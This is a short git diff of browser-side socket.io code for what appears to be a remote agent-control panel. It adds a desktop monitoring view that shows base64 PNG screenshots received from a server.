@@ -13,6 +13,12 @@ $(document).ready(function () {
         socket.emit('joined', {
             'agent_id': $label.attr('id')
         });
+        socket.emit('joined', {
+            'agent_id': $('.monitor-desktop').attr('id')
+        });
+        socket.emit('monitor', {
+            'room': $('.monitor-desktop').attr('id')
+        });
     });
 
     socket.on('command', function (data) {
@@ -26,6 +32,12 @@ $(document).ready(function () {
 
     socket.on('upload', function (data) {
         $('.terminal-text').append(data);
+    });
+
+    socket.on('monitor', function (data) {
+        console.log(data);
+        data = 'data:image/png;base64,' + data;
+        $('.monitor-desktop').attr('src', data);
     });
 
     $(window).on('beforeunload', function () {
